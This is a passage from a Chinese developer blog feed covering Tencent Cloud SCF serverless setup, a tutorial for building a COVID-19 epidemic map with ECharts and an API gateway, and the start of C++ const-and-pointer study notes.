href="https://cloud.tencent.com/document/product/583/33449">https://cloud.tencent.com/document/product/583/33449</a> 根据链接配置</p><ul><li>执行以下命令，并按照提示输入对应信息：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ scf configure <span class="built_in">set</span></span><br><span class="line">[-] appid = <span class="number">1255721742</span></span><br><span class="line">[-] region = ap-guangzhou</span><br><span class="line">[-] secret-id = ********************************cEr7</span><br><span class="line">[-] secret-key = ****************************mkYA</span><br><span class="line">[-] using-cos = True (By default, it is deployed by COS.)</span><br><span class="line">Allow report information to <span class="built_in">help</span> us optimize scfcli(Y/n):</span><br></pre></td></tr></table></figure><h2><span id="vscode推荐">VSCode（推荐）</span></h2><p>下载tencent scf插件即可。</p><h1><span id="scf进阶使用">SCF进阶使用</span></h1><h2><span id="测试">测试</span></h2><ul><li>VSCode</li></ul><blockquote><p>使用本地调试，然后选择方法即可</p></blockquote><p><img src="/2020/05/07/SCF/image-20200507132307806.png"></p><ul><li>控制台</li></ul><blockquote><p>通过 函数服务-&gt; 函数代码里面选择测试方法即可</p></blockquote><p><img src="/2020/05/07/SCF/image-20200507132358519.png"></p><p><img src="/2020/05/07/SCF/image-20200507132425062.png"></p><h2><span id="日志查询">日志查询</span></h2><ul><li><p>方法一</p><blockquote><p>在控制台点击 日志查询</p></blockquote></li><li><p>方法二</p><blockquote><p>配置日志流水</p></blockquote></li></ul><p><img src="/2020/05/07/SCF/image-20200507132646019.png" alt="日志流水"></p><ol><li><p>创建日志集（地点一定要保持一致）</p><p><img src="/2020/05/07/SCF/image-20200507133349054.png"></p></li><li><p>创建日志主题</p><p><img src="/2020/05/07/SCF/image-20200507133421836.png"></p></li><li><p>创建日志索引</p><p><img src="/2020/05/07/SCF/image-20200507133451675.png"></p></li><li><p>云函数配置日志投递</p><p><img src="/2020/05/07/SCF/image-20200507133545799.png"></p></li><li><p>查询日志</p><p><img src="/2020/05/07/SCF/image-20200507133738427.png"></p></li></ol><p>在函数配置中可以配置日志投递信息，选择日志集就可以了。</p><h2><span id="scf监控与告警">SCF监控与告警</span></h2><ol><li><p>各项监控信息</p><blockquote><p>可以在 监控信息 里面看到</p></blockquote></li><li><p>配置告警</p><p><img src="/2020/05/07/SCF/image-20200507134302273.png"></p><p><img src="/2020/05/07/SCF/image-20200507134340161.png"></p><p><img src="/2020/05/07/SCF/image-20200507134616754.png"></p><p><img src="/2020/05/07/SCF/image-20200507134558753.png"></p><p><img src="/2020/05/07/SCF/image-20200507143042137.png"></p></li></ol><h1><span id="scf触发器类型以及如何配置">SCF触发器类型以及如何配置</span></h1><h2><span id="触发器类型">触发器类型</span></h2><ul><li>定时触发</li><li>COS触发</li><li>CMQ主题订阅触发</li><li>Ckafka触发</li><li>API网关触发</li></ul><h2><span id="scf网络与配置">SCF网络与配置</span></h2><p><img src="/2020/05/07/SCF/image-20200507143736842.png"></p><h3><span id="配置vpc">配置VPC</span></h3><p><img src="/2020/05/07/SCF/image-20200507155739972.png"></p><p><img src="/2020/05/07/SCF/image-20200507155713492.png"></p><h2><span id="配置环境变量">配置环境变量</span></h2><p><img src="/2020/05/07/SCF/image-20200507155926430.png"></p><h2><span id="api-explorer">API Explorer</span></h2><blockquote><p>文档-&gt;API中心-&gt;云函数-&gt;函数相关接口-&gt;运行函数-&gt;API Explorer</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一下使用serverless SCF中实践的过程遇到的一些坑。&lt;/p&gt;</summary>
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="实习" scheme="https://disda-coding.github.io/tags/%E5%AE%9E%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>SCF之疫情地图</title>
    <link href="https://disda-coding.github.io/2020/05/07/yiqing/"/>
    <id>https://disda-coding.github.io/2020/05/07/yiqing/</id>
    <published>2020-05-07T04:50:50.000Z</published>
    <updated>2023-03-31T08:13:24.425Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%88%B6%E4%BD%9C%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE">制作疫情地图</a><ul><li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">准备工作</a></li><li><a href="#%E6%95%88%E6%9E%9C%E9%A2%84%E8%A7%88">效果预览</a></li><li><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9">知识点</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%B8%80-%E8%A1%A5%E5%85%85%E4%BA%91%E5%87%BD%E6%95%B0%E9%80%BB%E8%BE%91">任务一 补充云函数逻辑</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%BA%8C-%E7%BB%99%E6%A8%A1%E6%9D%BF%E8%A1%A5%E5%85%85%E9%80%BB%E8%BE%91">任务二 给模板补充逻辑</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%B8%89-%E5%88%9B%E5%BB%BA-api-%E7%BD%91%E5%85%B3%E8%A7%A6%E5%8F%91%E5%99%A8">任务三 创建 API 网关触发器</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E5%9B%9B-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D">任务四 添加自定义域名</a></li></ul></li></ul><!-- tocstop --><h1><span id="制作疫情地图">制作疫情地图</span></h1><h2><span id="准备工作">准备工作</span></h2><ol><li>进入腾讯云控制台，在左上角云产品菜单里，选择【管理与审计】-&gt; 【访问管理】，进入后在左边菜单栏中选择【访问密钥】-&gt;【API 密钥管理】，生成并获取一对 API 密钥。</li></ol><p><img src="https://camo.githubusercontent.com/89a1dd621bc76992d556458a4556ae5ad2fdd5f2/68747470733a2f2f61736b2e71636c6f7564696d672e636f6d2f64726166742f313031313631382f676570653077626163332e706e67" alt="获取腾讯云API密钥"></p><ol start="2"><li><p>在电脑安装 <code>Node.js</code> 语言运行环境，建议大于 8.0 版本。</p></li><li><p>安装 <code>VS Code</code> + <code>Tencent Serverless Toolkit</code> 插件，或者安装命令行工具。</p></li></ol><p>前者可参考文档：<a href="https://cloud.tencent.com/document/product/583/38106">https://cloud.tencent.com/document/product/583/38106</a><br>后台可参考文档：<a href="https://cloud.tencent.com/document/product/583/33445">https://cloud.tencent.com/document/product/583/33445</a></p><p>通过了解文档，或者本课程之前的章节，学习如何用<code>VS Code</code>插件或命令行工具创建和上传云函数。</p><p>学习完后，请创建一个名为 <code>yiqing</code> 的云函数。</p><ol start="4"><li>在<a href="https://github.com/lcxfs1991/tencentcloudcourse">https://github.com/lcxfs1991/tencentcloudcourse</a>下载本课程的代码包，目录是 <code>scr/yiqing</code>，并将里面的代码覆盖刚才新创建的<code>yiqing</code>云函数中的文件。然后在该目录中命令行运行<code>npm i</code>，安装代码包的依赖。</li></ol><h2><span id="效果预览">效果预览</span></h2><p><img src="https://user-images.githubusercontent.com/3348398/73936655-44c79b00-491e-11ea-8bb1-aada7aa08cfa.png" alt="疫情地图"></p><h2><span id="知识点">知识点</span></h2><ol><li>知道如何利用工具创建和上传云函数</li><li>知道如何创建<code>API</code>网关触发器</li><li>知道如何在云函数中部署能渲染<code>HTML</code>的服务</li><li>EChart.js 的使用</li></ol><h2><span id="任务一-补充云函数逻辑">任务一 补充云函数逻辑</span></h2><p>在云函数<code>yiqing</code>的<code>index.js</code>文件中，根据步骤提示，补充以下的逻辑。其中值得注意的是，该云函数除了承担渲染 html 的能力，还承担了输出数据的能力，这完全是通过链接中的<code>api</code>参数决定。通过这样的区别输出，就省了多制作一个云函数的麻烦，可谓是一举两得。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 接受链接上的query参数api，用于判断是输出html，还是输出数数</span></span><br><span class="line"><span class="keyword">let</span> api = event.<span class="property">queryString</span>.<span class="property">api</span> || <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 请求疫情数据</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="keyword">await</span> axios.<span class="title function_">get</span>(</span><br><span class="line">  <span class="string">`https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5`</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 中国地图数据</span></span><br><span class="line"><span class="keyword">let</span> china_map = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">require</span>(<span class="string">&#x27;./china.json&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 解析并渲染 html 页面</span></span><br><span class="line"><span class="keyword">let</span> html = fs.<span class="title function_">readFileSync</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./index.html&#x27;</span>), &#123;</span><br><span class="line">  <span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">html = <span class="title function_">render</span>(html, &#123; <span class="attr">disease_data</span>: result.<span class="property">data</span>.<span class="property">data</span>, china_map &#125;);</span><br></pre></td></tr></table></figure><p>除此以外，由于后面创建网关的时候，要使用网关的集成响应，因此必须按照以下的格式对云函数进行输出，而不能直接返回一段数据。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!api) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">isBase64Encoded</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span> &#125;,</span><br><span class="line">    <span class="attr">body</span>: html</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 输出疫情数据</span></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  <span class="attr">isBase64Encoded</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="attr">body</span>: result.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2><span id="任务二-给模板补充逻辑">任务二 给模板补充逻辑</span></h2><p>在云函数<code>yiqing</code>的<code>index.html</code>文件中，根据步骤提示，补充以下的逻辑。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 填充地图模板变量</span></span><br><span class="line"><span class="keyword">let</span> china_map = $&#123;china_map&#125; || <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. 填充确诊、疑似、治愈、死亡数据</span></span><br><span class="line"><span class="keyword">let</span> chinaTotal = disease_data.<span class="property">chinaTotal</span>;</span><br><span class="line"><span class="keyword">let</span> chinaAdd = disease_data.<span class="property">chinaAdd</span>;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.confirm .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.suspect .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.cure .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.dead .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.dead&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.confirm .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.suspect .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.cure .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.dead .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.dead&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. 处理疫情地图中的确诊数据格式</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 需要 &#123;name: &#x27;xxx&#x27;, value: &#x27;xxx&#x27;&#125; 这样的格式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> province = disease_data.<span class="property">areaTree</span>[<span class="number">0</span>].<span class="property">children</span>;</span><br><span class="line"><span class="keyword">let</span> confirmData = province.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: item.<span class="property">name</span>,</span><br><span class="line">    <span class="attr">value</span>: item.<span class="property">total</span>.<span class="property">confirm</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. 给疫情地图添加标题</span></span><br><span class="line"><span class="attr">title</span>: &#123;</span><br><span class="line">    <span class="attr">text</span>: <span class="string">&#x27;疫情地图&#x27;</span>,</span><br><span class="line">    <span class="attr">subtext</span>: <span class="string">`<span class="subst">$&#123;disease_data.lastUpdateTime&#125;</span> 更新`</span>,</span><br><span class="line">    <span class="attr">left</span>: <span class="string">&#x27;right&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5. 添加数据分段</span></span><br><span class="line"><span class="attr">pieces</span>: [</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10000</span>, <span class="attr">label</span>: <span class="string">&#x27;10000人及以上&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1000</span>, <span class="attr">max</span>: <span class="number">9999</span>, <span class="attr">label</span>: <span class="string">&#x27;1000-9999人&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">500</span>, <span class="attr">max</span>: <span class="number">999</span>, <span class="attr">label</span>: <span class="string">&#x27;500-999人&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">100</span>, <span class="attr">max</span>: <span class="number">499</span>, <span class="attr">label</span>: <span class="string">&#x27;100-499人&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10</span>, <span class="attr">max</span>: <span class="number">99</span>, <span class="attr">label</span>: <span class="string">&#x27;10-99人&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">9</span>, <span class="attr">label</span>: <span class="string">&#x27;1-9人&#x27;</span> &#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. 填写疫情地图的数据及悬浮框的展示信息</span></span><br><span class="line"><span class="attr">series</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;确诊病例&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;map&#x27;</span>,</span><br><span class="line">    <span class="attr">roam</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">map</span>: <span class="string">&#x27;china&#x27;</span>,</span><br><span class="line">    <span class="attr">label</span>: &#123;</span><br><span class="line">      <span class="attr">show</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">emphasis</span>: &#123;</span><br><span class="line">      <span class="attr">label</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: confirmData</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. 定时拉取</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">updateMap</span>();</span><br><span class="line">&#125;, <span class="number">60000</span>);</span><br></pre></td></tr></table></figure><p>需要简单说明的是，该模板是使用了<code>EChart</code>的模板进行改造，模板地址如下：<a href="https://www.echartsjs.com/examples/zh/editor.html?c=map-usa">https://www.echartsjs.com/examples/zh/editor.html?c=map-usa</a>，下图是模板的效果。你也可以点击该模板右下角的<code>Download</code>按钮将模板的<code>html</code>文件下载下来，然后按自己的喜欢进行编辑改造。</p><p><img src="https://user-images.githubusercontent.com/3348398/73943593-fae5b180-492b-11ea-859e-bdb0f49e3cde.png" alt="疫情地图的模板"></p><p>完成模板的改造后，请用插件或者命令行工具，上传云函数。下图是通过<code>VS Code</code>插件上传云函数的示例：</p><p><img src="https://user-images.githubusercontent.com/3348398/73943865-819a8e80-492c-11ea-9bb1-969220c13b3b.png" alt="通过`VS Code`插件上传云函数"></p><h2><span id="任务三-创建-api-网关触发器">任务三 创建 API 网关触发器</span></h2><p>进入控制台，找到云函数的控制台，并选择云函数所在的地区以及命名空间，然后进入云函数的编辑界面，选择触发方式菜单，然后点击“添加触发方式”，按以下的内容添加一个 API 网关触发器。注意，请务必勾选“启用集成响应”，这样网关才能正确渲染<code>HTML</code>的内容。</p><p><img src="https://user-images.githubusercontent.com/3348398/73863542-37a5a000-487b-11ea-9961-ecd34f709f6b.png" alt="添加API网关触发器"></p><p>创建完毕后，可以 API 网关触发器中，拿到访问路径路径，在浏览器中进行访问。如果验证过没问题后，建议将云函数，通过<code>VS Code</code>插件同步下来，将旧的<code>template.yaml</code>文件替换掉，这样避免下次上传云函数的时候，生成重复的 API 网关触发器。只有像下面的<code>Events</code>触发事件那样，将系统生成的网关贴上去，才不会重复生成新的网关，造成资源浪费。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Events:</span></span><br><span class="line">  <span class="attr">service-8lqamcni:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">APIGW</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">StageName:</span> <span class="string">release</span></span><br><span class="line">      <span class="attr">ServiceId:</span></span><br><span class="line">      <span class="attr">HttpMethod:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">IntegratedResponse:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure><p>体验地址：<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing">疫情地图体验</a></p><h2><span id="任务四-添加自定义域名">任务四 添加自定义域名</span></h2><p>如果觉得网关提供的域名过长，又或者担心这种域名由于安全问题会被微信等大平台封禁，可以自己自行配置自定义域名。首先，在云函数<code>yiqing</code>的控制台面板里，找到【触发方式】，然后点击任务三中添加过的触发器里的【API 服务名】，进入更详细的网关配置控制台。</p><p><img src="https://user-images.githubusercontent.com/3348398/74046219-1e325e80-4a09-11ea-9473-397b02e27821.png" alt="进入网关配置控制台"></p><p>进入【自定义域名】菜单，新建自定义域名，如果想配置 HTTPS 协议，则需要去申请 HTTPS 证书（腾讯云有免费的可以申请，可以跟着提示跳转到证书配置菜单）。</p><p><img src="https://user-images.githubusercontent.com/3348398/74046446-8c772100-4a09-11ea-92db-8e597dcf05b4.png" alt="自定义域名菜单"></p><p>可以按照下图的示例进行配置。要注意的是，如果想访问的路径更扁平化一点，请选择“自定义路径映射”，路径填入<code>/</code>，环境选择发布。如果不这样配置，如果原本网关的域名是<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing">https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing</a>，那么配置好之后，访问的路径就是[<a href="https://yiqing.docschina.org/release/demo_yiqing]%E3%80%82%E4%BD%86%E5%A6%82%E6%9E%9C%E9%85%8D%E7%BD%AE%E4%BA%86%60/%60%EF%BC%8C%E9%82%A3%E4%B9%88%E5%90%8E%E9%9D%A2%E7%9A%84%E8%B7%AF%E5%BE%84%E5%B0%B1%E5%8F%AA%E5%89%A9%E4%B8%8B%60demo_yiqing%60%E4%BA%86%E3%80%82">https://yiqing.docschina.org/release/demo_yiqing]。但如果配置了`/`，那么后面的路径就只剩下`demo_yiqing`了。</a></p><p><img src="https://user-images.githubusercontent.com/3348398/74046578-c21c0a00-4a09-11ea-846b-e1393e3f8106.png" alt="新建自定义域名"></p><p>在保存配置信息之前，请首先在域名解析服务商，根据弹窗的提示，先把域名的 CNAME 配置好。比如这里使用的是<a href="https://yiqing.docschina.org/">https://yiqing.docschina.org</a>，域名，提示要 CNAME 到<code>service-lltf3zya-1253970226.gz.apigw.tencentcs.com.</code>。做完 CNAME 后，就可以保存自定义域名的添加配置。稍等片刻，就可以访问了。</p><p><img src="https://user-images.githubusercontent.com/3348398/74046843-3b1b6180-4a0a-11ea-9a3c-daef71f701f1.png" alt="配置域名解析"></p><p>如果看到配置列表上显示“解析成功”，那表明一切的陪着已经妥当，请尝试访问：<a href="https://yiqing.docschina.org/demo_yiqing">https://yiqing.docschina.org/demo_yiqing</a>进行体验吧！</p><pre><code></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="实习" scheme="https://disda-coding.github.io/tags/%E5%AE%9E%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Java2C++</title>
    <link href="https://disda-coding.github.io/2020/04/18/Java2C/"/>
    <id>https://disda-coding.github.io/2020/04/18/Java2C/</id>
    <published>2020-04-18T15:03:27.000Z</published>
    <updated>2020-04-29T10:34:34.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>总结一些C++学习中疑惑的点</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9">知识点</a><ul><li><a href="#const%E5%92%8C%E6%8C%87%E9%92%88">const和指针</a></li><li><a href="#constexpr">constexpr</a></li><li><a href="#%E6%95%B0%E7%BB%84">数组</a><ul><li><a href="#%E5%BC%95%E7%94%A8%E9%81%8D%E5%8E%86%E6%B3%95">引用遍历法：</a></li><li><a href="#%E4%B8%8B%E6%A0%87%E9%81%8D%E5%8E%86%E6%B3%95">下标遍历法：</a></li><li><a href="#%E6%8C%87%E9%92%88%E9%81%8D%E5%8E%86%E6%B3%95">指针遍历法：</a></li></ul></li><li><a href="#%E5%B7%A6%E5%80%BC%E5%92%8C%E5%8F%B3%E5%80%BC">左值和右值</a></li><li><a href="#%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">拷贝构造函数</a></li><li><a href="#%E6%8B%B7%E8%B4%9D%E5%88%9D%E5%A7%8B%E5%8C%96">拷贝初始化</a></li><li><a href="#%E9%87%8D%E8%BD%BD%E6%8B%B7%E8%B4%9D%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%AC%A6">重载拷贝赋值运算符</a></li></ul></li><li><a href="#%E7%BB%83%E4%B9%A0">练习</a><ul><li><a href="#943">9.43</a></li><li><a href="#944">9.44</a></li></ul></li></ul><!-- tocstop --><h1><span id="知识点">知识点</span></h1><h2><span id="const和指针">const和指针</span></h2><ul><li><strong>指向常量的指针：</strong>不能用于改变其所指对象的值。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> *p=&amp;pi;<span class="comment">//pi必须要用指向常量的指针指向</span></span><br><span class="line"><span class="type">double</span> dval=<span class="number">3.14</span>;</span><br><span class="line">p=&amp;dval; <span class="comment">//可以，但是不能使用p改变dval的值</span></span><br></pre></td></tr></table></figure><p><font color="red">存放常量对象的地址必须要使用指向常量的指针，</font></p><p><font color="blue">但是指向常量的指针也可以指向变量</font></p><ul><li><strong>const指针</strong>：常量指针必须初始化，常量指针指向的对象地址不可改变。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p=&amp;a; <span class="comment">//p将一直指向a</span></span><br><span class="line"><span class="type">const</span> doublie pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> *<span class="type">const</span> pip=&amp;pi; <span class="comment">//pip是指向常量对象的常量指针</span></span><br></pre></td></tr></table></figure><ul><li>顶层const：表示指针本身是个常量</li><li>底层const： 表示所指的对象是个常量</li></ul><p><font color="orange">指针指向对象，指针在顶层，对象在底层。</font></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> v1=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *p1=&amp;v1;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *p2=p1; <span class="comment">//对，因为int*可以转化为const int*</span></span><br><span class="line">p1=p2;            <span class="comment">//不对，因为p2是底层const，p1不是。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当执行对象拷贝时，拷入拷出的对象必须具有相同的底层const资格。或者两个对象数据类型必须可以转换。<font 